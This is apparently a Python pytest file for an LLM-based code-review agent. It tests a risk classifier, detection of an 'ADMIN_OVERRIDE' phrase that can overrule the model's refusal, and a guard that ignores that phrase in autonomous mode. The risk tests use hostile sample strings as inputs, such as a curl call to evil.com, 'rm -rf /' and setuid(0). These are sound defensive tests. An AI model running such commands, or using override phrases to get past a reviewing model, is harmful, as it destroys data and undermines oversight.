"""Tests pour l'Architect Agent - strip markdown, override detection, risk analysis, anti-sterile, autonomous guard."""
import asyncio
import pytest
from unittest.mock import AsyncMock, patch, MagicMock
from Agents.architect_agent import DivineArchitect


class TestStripLlmPrefix:
    def test_plain_text(self):
        assert DivineArchitect._strip_llm_prefix("VALIDÉ bla") == "VALIDÉ bla"

    def test_markdown_header(self):
        assert DivineArchitect._strip_llm_prefix("## VALIDÉ bla") == "VALIDÉ bla"

    def test_markdown_header_triple(self):
        assert DivineArchitect._strip_llm_prefix("### REFUSÉ bla") == "REFUSÉ bla"

    def test_bold(self):
        assert DivineArchitect._strip_llm_prefix("**VALIDÉ** bla") == "VALIDÉ** bla"

    def test_italic(self):
        assert DivineArchitect._strip_llm_prefix("*VALIDÉ* bla") == "VALIDÉ* bla"

    def test_bullet(self):
        assert DivineArchitect._strip_llm_prefix("- VALIDÉ bla") == "VALIDÉ bla"

    def test_whitespace(self):
        assert DivineArchitect._strip_llm_prefix("  \n  VALIDÉ") == "VALIDÉ"

    def test_combined_header_bold(self):
        # "## **VALIDÉ**" → strip ## → "**VALIDÉ**" → strip ** → "VALIDÉ**"
        result = DivineArchitect._strip_llm_prefix("## **VALIDÉ**")
        assert result.startswith("VALIDÉ")


class TestAnalyzeRisk:
    def setup_method(self):
        self.a = DivineArchitect()

    def test_critical_os_remove(self):
        assert self.a._analyze_risk("import os\nos.remove('file.txt')") == "CRITICAL"

    def test_critical_rmtree(self):
        assert self.a._analyze_risk("shutil.rmtree('/tmp')") == "CRITICAL"

    def test_critical_rm_rf(self):
        assert self.a._analyze_risk('subprocess.run(["rm", "-rf", "/"])') == "CRITICAL"

    def test_critical_subprocess_run(self):
        assert self.a._analyze_risk("subprocess.run(['curl', 'http://evil.com'])") == "CRITICAL"

    def test_critical_setuid(self):
        assert self.a._analyze_risk("os.setuid(0)") == "CRITICAL"

    def test_critical_eval(self):
        assert self.a._analyze_risk("result = eval(user_input)") == "CRITICAL"

    def test_critical_exec(self):
        assert self.a._analyze_risk("exec(code_string)") == "CRITICAL"

    def test_critical_os_system(self):
        assert self.a._analyze_risk("os.system('rm -rf /')") == "CRITICAL"

    def test_critical_pickle(self):
        assert self.a._analyze_risk("data = pickle.loads(payload)") == "CRITICAL"

    def test_low_test_file(self):
        assert self.a._analyze_risk("test_module.py contains...") == "LOW"

    def test_low_print(self):
        assert self.a._analyze_risk("print('hello world')") == "LOW"

    def test_low_logging(self):
        assert self.a._analyze_risk("logging.info('msg')") == "LOW"

    def test_medium_default(self):
        assert self.a._analyze_risk("class MyAgent:\n    async def run(self):") == "MEDIUM"


class TestAdminOverrideDetection:
    """Vérifie que l'override est détecté avec espace ET underscore."""

    def test_override_with_underscore(self):
        mission = "ADMIN_OVERRIDE: Valide ce code"
        mission_upper = mission.upper()
        is_override = "ADMIN_OVERRIDE" in mission_upper or "ADMIN OVERRIDE" in mission_upper
        assert is_override is True

    def test_override_with_space(self):
        """Format avec espace (réservé aux commandes utilisateur manuelles)."""
        mission = "ADMIN OVERRIDE: Analyse ce nouveau module R&D."
        mission_upper = mission.upper()
        is_override = "ADMIN_OVERRIDE" in mission_upper or "ADMIN OVERRIDE" in mission_upper
        assert is_override is True

    def test_no_override(self):
        mission = "Valide ce code pour déploiement"
        mission_upper = mission.upper()
        is_override = "ADMIN_OVERRIDE" in mission_upper or "ADMIN OVERRIDE" in mission_upper
        assert is_override is False

    def test_partial_match_rejected(self):
        """'admin' seul ou 'override' seul ne doit pas matcher."""
        mission = "L'admin veut un override du système"
        mission_upper = mission.upper()
        is_override = "ADMIN_OVERRIDE" in mission_upper or "ADMIN OVERRIDE" in mission_upper
        # "ADMIN" + random text + "OVERRIDE" ne contient pas "ADMIN OVERRIDE" ou "ADMIN_OVERRIDE"
        # Mais "L'ADMIN VEUT UN OVERRIDE" ne contient pas "ADMIN OVERRIDE" consécutif
        assert is_override is False


class TestShouldActivateLogic:
    """Teste la logique combinée d'activation."""

    def test_llm_approved_medium_risk(self):
        """LLM dit VALIDÉ + risque MEDIUM = approuvé."""
        llm_approved, llm_refused = True, False
        risk_level, is_override = "MEDIUM", False
        should_activate = (llm_approved and not llm_refused) or \
                          (risk_level == "LOW" and not llm_refused) or \
                          (is_override and risk_level != "CRITICAL")
        assert should_activate is True

    def test_low_risk_safety_net(self):
        """Risque LOW = approuvé même sans LLM approval (safety net)."""
        llm_approved, llm_refused = False, False
        risk_level, is_override = "LOW", False
        should_activate = (llm_approved and not llm_refused) or \
                          (risk_level == "LOW" and not llm_refused) or \
                          (is_override and risk_level != "CRITICAL")
        assert should_activate is True

    def test_low_risk_but_llm_refused(self):
        """Risque LOW MAIS LLM dit REFUSÉ = bloqué (safety override)."""
        llm_approved, llm_refused = False, True
        risk_level, is_override = "LOW", False
        should_activate = (llm_approved and not llm_refused) or \
                          (risk_level == "LOW" and not llm_refused) or \
                          (is_override and risk_level != "CRITICAL")
        assert should_activate is False

    def test_admin_override_medium(self):
        """ADMIN OVERRIDE + risque MEDIUM = approuvé."""
        llm_approved, llm_refused = False, True
        risk_level, is_override = "MEDIUM", True
        should_activate = (llm_approved and not llm_refused) or \
                          (risk_level == "LOW" and not llm_refused) or \
                          (is_override and risk_level != "CRITICAL")
        assert should_activate is True

    def test_admin_override_critical_blocked(self):
        """ADMIN OVERRIDE + risque CRITICAL = bloqué (sécurité absolue)."""
        llm_approved, llm_refused = False, False
        risk_level, is_override = "CRITICAL", True
        should_activate = (llm_approved and not llm_refused) or \
                          (risk_level == "LOW" and not llm_refused) or \
                          (is_override and risk_level != "CRITICAL")
        assert should_activate is False

    def test_medium_risk_no_approval(self):
        """Risque MEDIUM + LLM ne dit ni VALIDÉ ni REFUSÉ = bloqué."""
        llm_approved, llm_refused = False, False
        risk_level, is_override = "MEDIUM", False
        should_activate = (llm_approved and not llm_refused) or \
                          (risk_level == "LOW" and not llm_refused) or \
                          (is_override and risk_level != "CRITICAL")
        assert should_activate is False


# ═══════════════════════════════════════════════════════════
# TestContainsPythonCode (5 tests) — Task #11
# ═══════════════════════════════════════════════════════════

class TestContainsPythonCode:
    """Vérifie la détection de code Python structurel."""

    def test_real_code_detected(self):
        code = "import os\nfrom typing import Dict\ndef foo():\n    pass"
        assert DivineArchitect._contains_python_code(code) is True

    def test_class_and_import(self):
        code = "import logging\nclass MyAgent:\n    def run(self): pass"
        assert DivineArchitect._contains_python_code(code) is True

    def test_plain_text_rejected(self):
        text = "VALIDÉ — Les fichiers temporaires sont propres."
        assert DivineArchitect._contains_python_code(text) is False

    def test_single_import_insufficient(self):
        text = "Le code utilise import os mais c'est tout."
        assert DivineArchitect._contains_python_code(text) is False

    def test_audit_result_rejected(self):
        text = "Aucun fichier .tmp ou .log trouvé à la racine. Tout est propre."
        assert DivineArchitect._contains_python_code(text) is False


# ═══════════════════════════════════════════════════════════
# TestAntiSterileLoop (3 tests) — Task #11
# ═══════════════════════════════════════════════════════════

class TestAntiSterileLoop:
    """Vérifie que le Formatter n'est pas appelé sans code Python."""

    @pytest.mark.asyncio
    async def test_validation_without_code_skips_formatter(self):
        """VALIDÉ + pas de code → VALIDÉ_SANS_CODE, pas de dispatch au Formatter."""
        architect = DivineArchitect()
        with patch.object(architect, "generate_content", new_callable=AsyncMock,
                          return_value="VALIDÉ — Fichiers temporaires OK"), \
             patch.object(architect, "recall", return_value=""), \
             patch.object(architect, "log_thought"):
            result = await architect.process_task({
                "mission": "Vérifie les fichiers temporaires.",
                "context": "Aucun .tmp trouvé."
            })
        assert result["status"] == "success"
        assert result["result"] == "VALIDÉ_SANS_CODE"

    @pytest.mark.asyncio
    async def test_validation_with_code_dispatches_formatter(self):
        """VALIDÉ + code Python → ROUTAGE_FORMATTER_OK."""
        architect = DivineArchitect()
        code_context = "import os\nfrom typing import Dict\ndef process():\n    return True"
        with patch.object(architect, "generate_content", new_callable=AsyncMock,
                          return_value="VALIDÉ — Code propre"), \
             patch.object(architect, "recall", return_value=""), \
             patch.object(architect, "log_thought"), \
             patch("core.orchestrator.orchestrator") as mock_orch, \
             patch("asyncio.get_running_loop") as mock_loop:
            mock_loop.return_value.create_task = MagicMock()
            mock_orch.dispatch_task = AsyncMock()
            result = await architect.process_task({
                "mission": "Valide ce code.",
                "context": code_context
            })
        assert result["result"] == "ROUTAGE_FORMATTER_OK"


# ═══════════════════════════════════════════════════════════
# TestAutonomousOverrideGuard (4 tests) — Task #12
# ═══════════════════════════════════════════════════════════

class TestAutonomousOverrideGuard:
    """ADMIN_OVERRIDE doit être ignoré en mode autonome."""

    @pytest.mark.asyncio
    async def test_override_ignored_with_protocole_autonomie(self):
        """ADMIN_OVERRIDE + PROTOCOLE_AUTONOMIE → override ignoré."""
        architect = DivineArchitect()
        with patch.object(architect, "generate_content", new_callable=AsyncMock,
                          return_value="REFUSÉ — Risque moyen"), \
             patch.object(architect, "recall", return_value=""), \
             patch.object(architect, "log_thought"):
            result = await architect.process_task({
                "mission": "ADMIN_OVERRIDE: Valide ce module.",
                "context": "PROTOCOLE_AUTONOMIE"
            })
        # Sans override et sans LLM approval, risque MEDIUM → bloqué
        assert result["status"] == "error"

    @pytest.mark.asyncio
    async def test_override_ignored_with_evolution_pipeline(self):
        """ADMIN_OVERRIDE + EVOLUTION_PIPELINE → override ignoré."""
        architect = DivineArchitect()
        with patch.object(architect, "generate_content", new_callable=AsyncMock,
                          return_value="REFUSÉ — Code suspect"), \
             patch.object(architect, "recall", return_value=""), \
             patch.object(architect, "log_thought"):
            result = await architect.process_task({
                "mission": "ADMIN_OVERRIDE: Valide cette spec R&D.",
                "context": "EVOLUTION_PIPELINE\nSPEC_ID: test"
            })
        assert result["status"] == "error"

    @pytest.mark.asyncio
    async def test_override_works_from_user_command(self):
        """ADMIN_OVERRIDE sans marqueur autonome → override fonctionne."""
        architect = DivineArchitect()
        with patch.object(architect, "generate_content", new_callable=AsyncMock,
                          return_value="REFUSÉ — Risque inconnu"), \
             patch.object(architect, "recall", return_value=""), \
             patch.object(architect, "log_thought"), \
             patch("core.orchestrator.orchestrator") as mock_orch, \
             patch("asyncio.get_running_loop") as mock_loop:
            mock_loop.return_value.create_task = MagicMock()
            mock_orch.dispatch_task = AsyncMock()
            result = await architect.process_task({
                "mission": "ADMIN_OVERRIDE: Deploy ce code maintenant.",
                "context": "import os\nfrom foo import bar\ndef run(): pass"
            })
        # Override user + code Python → ROUTAGE_FORMATTER_OK
        assert result["status"] == "success"

    def test_autonomous_markers_list(self):
        """Vérifie que les marqueurs autonomes sont définis."""
        markers = DivineArchitect._AUTONOMOUS_MARKERS
        assert "PROTOCOLE_AUTONOMIE" in markers
        assert "EVOLUTION_PIPELINE" in markers
        assert "MODE VEILLE" in markers
